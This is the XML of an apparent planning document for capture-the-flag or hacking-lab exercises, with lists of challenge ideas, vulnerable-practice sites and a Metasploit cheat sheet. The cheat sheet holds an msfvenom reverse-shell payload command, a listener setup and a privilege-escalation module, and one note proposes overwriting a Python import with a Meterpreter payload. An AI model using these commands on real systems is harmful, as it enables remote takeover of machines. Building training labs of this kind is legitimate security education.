      <text:p text:style-name="P41"/>
      <text:p text:style-name="P41">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P42"/>
      <text:p text:style-name="P80">The FTP with side channell attack.</text:p>
      <text:p text:style-name="P66"><text:span text:style-name="T43">Missions:</text:span><text:bookmark-start text:name="__DdeLink__852_2392804040"/><text:bookmark-end text:name="__DdeLink__852_2392804040"/></text:p>
      <text:p text:style-name="P66">* <text:span text:style-name="T51">There is login with password need to bypass using the side channel attack.</text:span></text:p>
      <text:p text:style-name="P66">* <text:span text:style-name="T62">in the website, </text:span><text:span text:style-name="T56">.</text:span></text:p>
      <text:p text:style-name="P67">* <text:span text:style-name="T58">maybe it imports time </text:span><text:span text:style-name="T59">to calculate the time or other python file, so overwrtie the file with msfvenum python meterpeter.</text:span></text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P70">Crypto side channel attack – <text:span text:style-name="T48">NO NEED FOR ONLINE</text:span>:</text:p>
      <text:p text:style-name="P70"/>
      <text:p text:style-name="P76"><text:span text:style-name="T47">get the password via the time to execute the calculation of the password is correct.</text:span></text:p>
      <text:p text:style-name="P71">Loops throw the password and check caracter by caracter.</text:p>
      <text:p text:style-name="P67"/>
      <text:p text:style-name="P68">https://bugs.python.org/issue35909</text:p>
      <text:p text:style-name="P60"/>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P38"><text:bookmark-start text:name="__DdeLink__622_2786724775"/><text:soft-page-break/>---------------------------------------------------------------------------------<text:bookmark-end text:name="__DdeLink__622_2786724775"/></text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P35">BEEF victim – <text:span text:style-name="T29">TODO – </text:span><text:span text:style-name="T30">understand how to exploit using metasploit.</text:span></text:p>
      <text:p text:style-name="P53">https://apprize.best/security/ethical_1/19.html</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P39"><text:bookmark-start text:name="__DdeLink__624_2786724775"/>---------------------------------------------------------------------------------<text:bookmark-end text:name="__DdeLink__624_2786724775"/></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P43">VM WITH PYTHON <text:span text:style-name="T49">SANBOX </text:span>CHALLENGE - <text:span text:style-name="T46">DONE</text:span>.</text:p>
      <text:p text:style-name="P63"/>
      <text:p text:style-name="P40"><text:bookmark-start text:name="__DdeLink__846_2392804040"/>---------------------------------------------------------------------------------<text:bookmark-start text:name="__DdeLink__848_2392804040"/><text:bookmark-end text:name="__DdeLink__846_2392804040"/><text:bookmark-end text:name="__DdeLink__848_2392804040"/></text:p>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P72">WINDOWS 7 VM</text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P72">* ftp exploit from metasploit.</text:p>
      <text:p text:style-name="P72">* smb share to learn impacket.</text:p>
      <text:p text:style-name="P72">* maybe beef.</text:p>
      <text:p text:style-name="P56"/>
      <text:p text:style-name="P56">---------------------------------------------------------------------------------</text:p>
      <text:p text:style-name="P72"/>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P40"/>
      <text:p text:style-name="P44">More Concepts to incorperate:</text:p>
      <text:p text:style-name="P44"/>
      <text:p text:style-name="P36">* <text:span text:style-name="T40">Wireshark challenge – open TLS and do something with it.</text:span></text:p>
      <text:p text:style-name="P36">https://www.comparitech.com/net-admin/decrypt-ssl-with-wireshark/</text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P36">* <text:span text:style-name="T27">Use john the ripper.</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">* <text:span text:style-name="T26">linux kernel local privelege escelation.</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P33">* <text:span text:style-name="T25">Maybe a reversing challenge from Google CTF </text:span><text:span text:style-name="T28">or other CTF</text:span><text:span text:style-name="T25">.</text:span></text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P34">===========================================================</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P61">more vulnerable containers:</text:p>
      <text:p text:style-name="P3">https://hub.docker.com/u/vulnerables</text:p>
      <text:p text:style-name="P29"/>
      <text:p text:style-name="P28">need to install docker and docker compose.</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P27">vulnhub.</text:p>
      <text:p text:style-name="P27">this is also very good: <text:bookmark-start text:name="__DdeLink__582_3349739104"/><text:a xlink:type="simple" xlink:href="https://github.com/vulhub" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/vulhub</text:a><text:bookmark-end text:name="__DdeLink__582_3349739104"/></text:p>
      <text:p text:style-name="P27">and this https://github.com/Ignitetechnologies/Vulnhub-CTF-Writeups</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P22">Think of exercises from here: <text:a xlink:type="simple" xlink:href="https://www.sjoerdlangkemper.nl/2018/12/19/practice-hacking-with-vulnerable-systems/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.sjoerdlangkemper.nl/2018/12/19/practice-hacking-with-vulnerable-systems/</text:a></text:p>
      <text:p text:style-name="P22"/>
      <text:p text:style-name="P24">this is also interesting: <text:a xlink:type="simple" xlink:href="https://www.root-me.org/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.root-me.org/</text:a>, <text:a xlink:type="simple" xlink:href="https://www.vulnhub.com/?page=2" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.vulnhub.com/?page=2</text:a></text:p>
      <text:p text:style-name="P24"><text:a xlink:type="simple" xlink:href="https://github.com/apsdehal/awesome-ctf" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/apsdehal/awesome-ctf</text:a> – in the end there are CTFs.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P25"><text:soft-page-break/>Maybe google ctf: <text:a xlink:type="simple" xlink:href="https://github.com/google/google-ctf" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/google/google-ctf</text:a> – <text:span text:style-name="T23">this is a hard one.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P18">Take all the tools from kali linux.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17">Test with windows WSL or doker for windows.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P23">Maybe powersploit.</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P21">Possibly have a windows 7 VM so they work with smb.<text:bookmark-start text:name="__DdeLink__52_3755670151"/><text:bookmark-end text:name="__DdeLink__52_3755670151"/></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P19">=========================</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8">Things:</text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P11">msfvenom cheatsheet: <text:bookmark-start text:name="__DdeLink__844_2392804040"/><text:a xlink:type="simple" xlink:href="https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/</text:a><text:bookmark-end text:name="__DdeLink__844_2392804040"/></text:p>
      <text:p text:style-name="P13">metasploit cheatsheet.</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P8">Metasploit: </text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T18"><text:tab/>create a conna</text:span><text:span text:style-name="T19">e</text:span><text:span text:style-name="T18">cting shell: </text:span><text:bookmark-start text:name="__DdeLink__8_3755670151"/><text:bookmark-start text:name="__DdeLink__802_2392804040"/><text:span text:style-name="T3">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Local IP Address&gt; LPORT=&lt;Local Port&gt; -f elf &gt; shell.elf</text:span><text:bookmark-end text:name="__DdeLink__8_3755670151"/><text:bookmark-end text:name="__DdeLink__802_2392804040"/></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P57"><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T20">setup a listener:</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14">$ ./msfconsole -q</text:p>
      <text:p text:style-name="P2">msf <text:span text:style-name="T21">&gt;</text:span> <text:bookmark-start text:name="__DdeLink__10_3755670151"/><text:bookmark-start text:name="__DdeLink__804_2392804040"/>use exploit/multi/handler<text:bookmark-end text:name="__DdeLink__10_3755670151"/><text:bookmark-end text:name="__DdeLink__804_2392804040"/></text:p>
      <text:p text:style-name="P2">msf exploit(handler) <text:span text:style-name="T21">&gt;</text:span> <text:bookmark-start text:name="__DdeLink__806_2392804040"/>set payload linux/x86/meterpreter/reverse_tcp<text:bookmark-end text:name="__DdeLink__806_2392804040"/></text:p>
      <text:p text:style-name="P46"><text:span text:style-name="T4">msf exploit(handler) </text:span><text:span text:style-name="T6">&gt;</text:span><text:span text:style-name="T4"> </text:span><text:bookmark-start text:name="__DdeLink__12_3755670151"/><text:bookmark-start text:name="__DdeLink__809_2392804040"/><text:span text:style-name="T7">set</text:span><text:span text:style-name="T4"> lhost </text:span><text:bookmark-end text:name="__DdeLink__12_3755670151"/><text:span text:style-name="T5">172.17.0.2</text:span><text:bookmark-end text:name="__DdeLink__809_2392804040"/></text:p>
      <text:p text:style-name="P2">lhost =<text:span text:style-name="T21">&gt;</text:span> 192.168.1.123</text:p>
      <text:p text:style-name="P2">msf exploit(handler) <text:span text:style-name="T21">&gt;</text:span> <text:span text:style-name="T22">set</text:span> lport 4444</text:p>
      <text:p text:style-name="P2">lport =<text:span text:style-name="T21">&gt;</text:span> 4444</text:p>
      <text:p text:style-name="P2">msf exploit(handler) <text:span text:style-name="T21">&gt;</text:span> run</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12">metasploit put shell in background.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P59">Find local pe</text:p>
      <text:p text:style-name="P48"><text:bookmark-start text:name="__DdeLink__812_2392804040"/>post/multi/recon/local_exploit_suggest<text:bookmark-end text:name="__DdeLink__812_2392804040"/><text:span text:style-name="T36">er</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">To enable ssh connection:</text:p>
      <text:p text:style-name="P5"><text:tab/><text:span text:style-name="T17">when sudo: passwd with password 123</text:span></text:p>
      <text:p text:style-name="P5"><text:tab/>adduser moses <text:span text:style-name="T17">with password 123</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1"><text:tab/></text:span><text:bookmark-start text:name="__DdeLink__616_2786724775"/><text:bookmark-start text:name="__DdeLink__18_3755670151"/><text:bookmark-start text:name="__DdeLink__26_3755670151"/><text:bookmark-start text:name="__DdeLink__6_3755670151"/><text:bookmark-start text:name="__DdeLink__16_3755670151"/><text:bookmark-start text:name="__DdeLink__14_3755670151"/><text:span text:style-name="T1">usermod -aG sudo moses</text:span><text:bookmark-end text:name="__DdeLink__616_2786724775"/><text:bookmark-end text:name="__DdeLink__18_3755670151"/><text:bookmark-end text:name="__DdeLink__26_3755670151"/><text:bookmark-end text:name="__DdeLink__6_3755670151"/><text:bookmark-end text:name="__DdeLink__16_3755670151"/><text:bookmark-end text:name="__DdeLink__14_3755670151"/></text:p>
      <text:p text:style-name="P7"><text:tab/>look at: https://bencane.com/2013/07/22/ssh-disable-host-checking-for-scripts-automation/</text:p>
      <text:p text:style-name="P6"><text:tab/><text:span text:style-name="T16">change the file in the path: </text:span><text:bookmark-start text:name="__DdeLink__4_3755670151"/><text:bookmark text:name="__DdeLink__1_3755670151"/><text:span text:style-name="T2">/etc/ssh/sshd_config</text:span><text:bookmark-end text:name="__DdeLink__4_3755670151"/></text:p>
      <text:p text:style-name="P15"><text:tab/>put inside the following content:</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16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1" svg:font-family="Consolas, 'Bitstream Vera Sans Mono', 'Courier New', Courier, monospace"/>
    <style:font-face style:name="Consolas" svg:font-family="Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace"/>
    <style:font-face style:name="Lohit Devanagari1" svg:font-family="'Lohit Devanagari'"/>
    <style:font-face style:name="Menlo" svg:font-family="Menlo, Monaco, Consolas, 'liberation mono', 'courier new', monospace"/>
    <style:font-face style:name="Monaco1" svg:font-family="Monaco, Consolas, 'Andale Mono', 'DejaVu Sans Mono', monospace"/>
    <style:font-face style:name="Monaco2" svg:font-family="Monaco, Menlo, Consolas, 'Courier New', monospace"/>
    <style:font-face style:name="Monaco" svg:font-family="Monaco, monospace"/>
    <style:font-face style:name="Roboto" svg:font-family="Roboto, sans-serif"/>
    <style:font-face style:name="SFMono-Regular" svg:font-family="SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace"/>
    <style:font-face style:name="SFMono-Regular1" svg:font-family="SFMono-Regular, Menlo, Monaco, Consolas, 'liberation mono', 'courier new', monospace"/>
    <style:font-face style:name="apple-system" svg:font-family="apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji'"/>
    <style:font-face style:name="lato" svg:font-family="lato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7:38:42.908746563</meta:creation-date>
    <dc:date>2020-12-01T00:05:36.292683443</dc:date>
    <meta:editing-duration>P5DT18H2M31S</meta:editing-duration>
    <meta:editing-cycles>178</meta:editing-cycles>
    <meta:generator>LibreOffice/6.4.6.2$Linux_X86_64 LibreOffice_project/40$Build-2</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="4" meta:paragraph-count="88" meta:word-count="552" meta:character-count="4624" meta:non-whitespace-character-count="4138"/>
  </office:meta>
</office:document-meta>
</file>